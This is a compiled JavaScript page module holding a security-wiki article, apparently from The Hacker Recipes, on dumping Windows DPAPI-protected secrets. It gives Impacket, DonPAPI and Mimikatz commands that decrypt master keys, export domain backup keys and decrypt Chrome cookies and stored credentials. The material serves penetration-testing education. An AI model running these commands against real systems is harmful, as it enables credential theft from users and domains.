import{_ as n,c as p,a5 as k,G as a,w as t,j as s,a as i,B as r,o as d}from"./chunks/framework.B5CpDqM0.js";const C=JSON.parse('{"title":"DPAPI secrets","description":"MITRE ATT&CK™ Sub-technique T1555.003","frontmatter":{"description":"MITRE ATT&CK™ Sub-technique T1555.003","authors":"Hackndo, ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/credentials/dumping/dpapi-protected-secrets.md","filePath":"ad/movement/credentials/dumping/dpapi-protected-secrets.md","lastUpdated":1724982529000}'),o={name:"ad/movement/credentials/dumping/dpapi-protected-secrets.md"};function c(y,e,g,F,u,m){const l=r("PluginTabsTab"),h=r("PluginTabs");return d(),p("div",null,[e[2]||(e[2]=k(`<h1 id="dpapi-secrets" tabindex="-1">DPAPI secrets <a class="header-anchor" href="#dpapi-secrets" aria-label="Permalink to &quot;DPAPI secrets&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at:</p><div class="language-batch vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">batch</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">C:\\Users\\$USER\\AppData\\Roaming\\Microsoft\\Protect\\$SUID\\$GUID</span></span></code></pre></div><p>Application like Google Chrome, Outlook, Internet Explorer, Skype use the DPAPI. Windows also uses that API for sensitive information like Wi-Fi passwords, certificates, RDP connection passwords, and many more.</p><p>Below are common paths of hidden files that usually contain DPAPI-protected data.</p><div class="language-batch vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">batch</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">C:\\Users\\$USER\\AppData\\Local\\Microsoft\\Credentials\\</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">C:\\Users\\$USER\\AppData\\Roaming\\Microsoft\\Credentials\\</span></span></code></pre></div><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2>`,8)),a(h,null,{default:t(()=>[a(l,{label:"UNIX-like"},{default:t(()=>e[0]||(e[0]=[s("p",null,[i("From UNIX-like systems, DPAPI-data can be manipulated (mainly offline) with tools like "),s("a",{href:"https://github.com/jordanbtucker/dpapick",target:"_blank",rel:"noreferrer"},"dpapick"),i(" (Python), "),s("a",{href:"https://github.com/dfirfpi/dpapilab",target:"_blank",rel:"noreferrer"},"dpapilab"),i(" (Python), "),s("a",{href:"https://github.com/SecureAuthCorp/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),i("'s "),s("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py",target:"_blank",rel:"noreferrer"},"dpapi.py"),i(" and "),s("a",{href:"https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",target:"_blank",rel:"noreferrer"},"secretsdump.py"),i(" (Python).")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# (not tested) Decrypt a master key")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dpapi.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," masterkey"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -file"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "/path/to/masterkey_file"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -sid"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER_SID "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-password"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $MASTERKEY_PASSWORD")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# (not tested) Obtain the backup keys & use it to decrypt a master key")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dpapi.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," backupkeys"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},":"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$TARGET")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dpapi.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," masterkey"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -file"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "/path/to/masterkey_file"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -pvk"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "/path/to/backup_key.pvk"')]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# (not tested) Decrypt DPAPI-protected data using a master key")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dpapi.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," credential"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -file"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "/path/to/protected_file"'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -key"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $MASTERKEY")])])])],-1),s("p",null,[s("a",{href:"https://github.com/login-securite/DonPAPI",target:"_blank",rel:"noreferrer"},"DonPAPI"),i(" (Python) can also be used to remotely extract a user's DPAPI secrets more easily. It supports "),s("a",{href:"./../../ntlm/pth"},"pass-the-hash"),i(", "),s("a",{href:"./../../kerberos/ptt"},"pass-the-ticket"),i(" and so on.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"DonPAPI.py"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'domain'/'username':'password'@"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"<"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'targetName'"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," or"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'address/mask'"),s("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},">")])])])],-1)])),_:1}),a(l,{label:"Windows"},{default:t(()=>e[1]||(e[1]=[s("p",null,[i("On Windows systems "),s("a",{href:"https://github.com/gentilkiwi/mimikatz",target:"_blank",rel:"noreferrer"},"Mimikatz"),i(" (C) can be used to extract dpapi with "),s("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/lsadump/backupkeys",target:"_blank",rel:"noreferrer"},[s("code",null,"lsadump::backupkeys")]),i(", decrypt with "),s("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/dpapi/chrome",target:"_blank",rel:"noreferrer"},[s("code",null,"dpapi::chrome")]),i(" and "),s("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/dpapi/cred",target:"_blank",rel:"noreferrer"},[s("code",null,"dpapi::cred")]),i(" or use specific master keys with "),s("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey",target:"_blank",rel:"noreferrer"},[s("code",null,"dpapi::masterkey")]),i(" and "),s("a",{href:"https://tools.thehacker.recipes/mimikatz/modules/sekurlsa/dpapi",target:"_blank",rel:"noreferrer"},[s("code",null,"sekurlsa::dpapi")]),i(" , using specified passwords or given sufficient privileges.")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Extract and decrypt a master key")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dpapi::masterkey"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' /in:"C:\\Users'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\$"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"USER\\AppData\\Roaming\\Microsoft\\Protect"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\$"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"SUID"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\$"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'GUID"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /sid:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$SID "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/password:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/protected")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Extract and decrypt all master keys")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"sekurlsa::dpapi")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Extract the backup keys & use it to decrypt a master key")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lsadump::backupkeys"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /system:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN_CONTROLLER "),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"/export")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dpapi::masterkey"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' /in:"C:\\Users'),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\$"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"USER\\AppData\\Roaming\\Microsoft\\Protect"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\$"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"SUID"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"\\$"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'GUID"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /pvk:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$BACKUP_KEY_EXPORT_PVK")]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Decrypt Chrome data")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dpapi::chrome"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' /in:"%localappdata%\\Google\\Chrome\\User Data\\Default\\Cookies"')]),i(`
`),s("span",{class:"line"}),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Decrypt DPAPI-protected data using a master key")]),i(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dpapi::cred"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' /in:"C:\\path\\to\\encrypted\\file"'),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," /masterkey:"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$MASTERKEY")])])])],-1)])),_:1})]),_:1}),e[3]||(e[3]=s("h2",{id:"resources",tabindex:"-1"},[i("Resources "),s("a",{class:"header-anchor",href:"#resources","aria-label":'Permalink to "Resources"'},"​")],-1)),e[4]||(e[4]=s("p",null,[s("a",{href:"https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords",target:"_blank",rel:"noreferrer"},"https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dpapi-extracting-passwords")],-1)),e[5]||(e[5]=s("p",null,[s("a",{href:"https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf",target:"_blank",rel:"noreferrer"},"https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf")],-1))])}const b=n(o,[["render",c]]);export{C as __pageData,b as default};
